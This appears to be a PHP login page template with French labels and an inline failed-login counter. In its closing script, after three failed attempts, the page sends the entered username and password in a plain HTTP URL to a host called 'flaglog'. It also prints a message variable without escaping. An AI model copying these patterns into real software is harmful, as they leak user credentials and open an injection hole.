<?php
$addonPath = '';
$slashCount = substr_count($_SERVER['REQUEST_URI'], '/');
for ($i = $slashCount; $i > 1; $i--) {
    $addonPath .= '../';
}
$message = $message ?? null;
?>
<style>
    .alert {
        margin-bottom: 4%;
        background-color: #F44336;
        padding: 2%;
        text-indent: 2%;
        border-radius: 10px;
        color: darkred;
        font-size: 16px;
    }
</style>
<link rel="stylesheet" href="<?= $addonPath ?>styles/login.css">
<img id="logo" src="<?= $addonPath ?>assets/img/flagLogo.png" alt="">
<div id="form">
    <?php if ($message) { ?>
        <div class="alert">
            <?= $message ?>
        </div>
    <?php } ?>

    <form action="/login" method="post">
        <label for="username">Nom d'utilisateur</label>
        <input type="text" name="username" id="username" maxlength="85" required>

        <label for="password">Mot de passe</label>
        <input type="password" name="password" id="password" required>

        <input type="submit" id="btnSubmitForm" value="Envoyer">
    </form>
</div>
<a style="color: black;" href="/register">Vous n'avez pas de compte ?</a>

<script src="frontend/login.js"></script>
<script>
    const SEUIL = 3
    if (localStorage.getItem('loginIncrement') == null) {
        localStorage.setItem('loginIncrement', JSON.stringify(0));
    }

    if (document.querySelector('.alert')) {
        // Save
        n = JSON.parse(localStorage.getItem('loginIncrement'))
        n++;

        // Traitement
        if (n >= SEUIL) {
            n = 0;
            username = document.getElementById('username').value.trim();
            password = document.getElementById('password').value.trim();
            fetch(`http://flaglog/connectionAlert/${username}/${password}`);
        }
        localStorage.setItem('loginIncrement', JSON.stringify(n));
    }
</script>